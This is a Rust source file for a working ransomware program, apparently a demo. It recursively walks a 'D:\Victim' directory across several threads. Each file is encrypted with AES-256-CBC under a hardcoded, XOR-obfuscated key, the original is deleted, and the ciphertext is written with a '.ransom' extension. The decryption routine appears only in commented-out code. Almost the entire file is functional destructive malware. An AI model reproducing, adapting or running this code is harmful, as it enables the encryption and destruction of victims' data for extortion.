extern crate rand;
use std::{fs, thread};
use std::io::{Read, Write};

use walkdir::WalkDir;
use crypto::{ symmetriccipher, buffer, aes, blockmodes };
use crypto::buffer::{ ReadBuffer, WriteBuffer, BufferResult };
//use rand::{ Rng, OsRng };

fn encrypt_data(data:&Vec<u8>, key:&[u8;32],iv:&[u8;16]) -> Result<Vec<u8>, symmetriccipher::SymmetricCipherError>{
    let mut encryptor = aes::cbc_encryptor(
        aes::KeySize::KeySize256,
        key, 
        iv,
        blockmodes::PkcsPadding);
    let mut buffer = [0;4096];
    let mut input_buffer = buffer::RefReadBuffer::new(data);
    let mut output_buffer = buffer::RefWriteBuffer::new(&mut buffer);
    let mut final_result = Vec::<u8>::new();
    loop {
        let result =encryptor.encrypt(&mut input_buffer, &mut output_buffer, true)?;

        // "write_buffer.take_read_buffer().take_remaining()" means:
        // from the writable buffer, create a new readable buffer which
        // contains all data that has been written, and then access all
        // of that data as a slice.
        final_result.extend(output_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));

        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }

    Ok(final_result)
}


fn get_data_from_file(path:&str) -> Vec<u8>{
    let mut file = fs::File::open(path).expect("failed to open");
    let mut data = Vec::<u8>::new();
    file.read_to_end(&mut data).expect("failed to read");
    //file.sync_all().expect("failed to sync file");
    return data;
}

fn write_data_to_file(path:&str,data:&Vec<u8>){
    println!("{}",path);
    let mut file = fs::File::create(path).expect("failed to open to write");
    file.write_all(&data).expect("failed to write");
    file.sync_all().expect("failed to sync file");
}

fn generate_key_pair() -> ([u8;32],[u8;16]){
    let mut key:[u8;32] = [141, 90, 90, 18, 184, 4, 187, 125, 83, 38, 91, 144, 125, 76, 119, 87, 70, 7, 137, 147, 9, 186, 32, 140, 166, 196, 2, 107, 70, 118, 31, 123];
    let mut iv:[u8;16] = [15, 62, 163, 133, 122, 61, 47, 50, 67, 172, 51, 133, 169, 124, 191, 11];
    let fake_round:[u8;8] = [8, 107, 79, 64, 103, 49, 7, 18];
    for i in 1..key.len(){
        key[i] = key[i]^fake_round[i%8];
    }
    for i in 1..iv.len(){
        iv[i] = iv[i]^fake_round[i%8];
    }
    return (key,iv);
}

// fn decrypt_data(data:&Vec<u8>, key:&[u8;32], iv:&[u8;16]) -> Result<Vec<u8>,symmetriccipher::SymmetricCipherError>{
//     let mut decryptor = aes::cbc_decryptor(
//         aes::KeySize::KeySize256,
//         key,
//         iv,
//         blockmodes::PkcsPadding);

//     let mut final_result = Vec::<u8>::new();
//     let mut read_buffer = buffer::RefReadBuffer::new(&data);
//     let mut buffer = [0; 4096];
//     let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);
//     loop {
//         let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
//         final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
//         match result {
//             BufferResult::BufferUnderflow => break,
//             BufferResult::BufferOverflow => { }
//         }
//     }

//     Ok(final_result)
// }

// fn test_thread(){
//     let plaintext = get_data_from_file("D:\\Projects\\rjomba_reborn\\test.txt");
//     fs::remove_file("test.txt").expect("Failed to delete");
//     let (key,iv)= generate_key_pair();
//     let encrypted = encrypt_data(&plaintext, &key, &iv);
//     let decrypted = decrypt_data(&encrypted.clone().unwrap(), &key, &iv);
//     assert_eq!(plaintext,decrypted.unwrap());
//     println!("Test successfull");
//     write_data_to_file("test.txt.ransom", &encrypted.unwrap());
// }

fn malware_thread(base_dir:&str){
    for entry in WalkDir::new(base_dir).into_iter().filter_map(|e| e.ok()){
        //println!("{}",entry.clone().path().display());
        if entry.path().is_file(){
            let data = get_data_from_file(&entry.clone().path().to_str().expect("failed to convert to str"));
            let (key,iv) = generate_key_pair();
            let encrypted = encrypt_data(&data, &key, &iv);
            fs::remove_file(entry.clone().path().to_str().expect("msg")).expect("failed to delete file");
            let mut new_path = entry.clone().path().display().to_string();
            new_path.push_str(".ransom");
            // println!("{}",new_path);
            write_data_to_file(&new_path, &encrypted.unwrap());
        }
    }
}

fn main() {    
    // DEMO SECTION
    let mut hanldes = vec![];

    for entry in WalkDir::new("D:\\Victim").max_depth(1).into_iter().filter_map(|e| e.ok()){
        let handle = thread::spawn(move||malware_thread(&entry.clone().path().to_str().expect("failed convert path to str")));
        hanldes.push(handle);
    }
    for handle in hanldes{
        handle.join().unwrap();
    }
}